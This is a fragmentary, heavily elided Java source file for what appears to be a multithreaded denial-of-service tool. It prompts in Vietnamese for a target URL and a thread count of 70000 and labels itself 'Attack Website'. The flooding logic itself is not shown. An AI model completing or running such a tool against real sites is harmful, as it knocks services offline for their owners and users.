...
public class Dos implements Runnable {
    ...
    public static void main(String[] args) throws Exception {
        ...
        url = in.nextLine();
        System.out.println("\n");
        System.out.println("Bắt Đầu Kết Nối Tới Web: " + url);
        ...
        System.out.println("Kết Nối Thành Công Tới Web");

        System.out.print("Thead [ 70000 ]: ");
    ...
    private void checkConnection(String url) throws Exception {
        System.out.println("Attack Website : Quynh & Hai");
        URL obj = new URL(url);
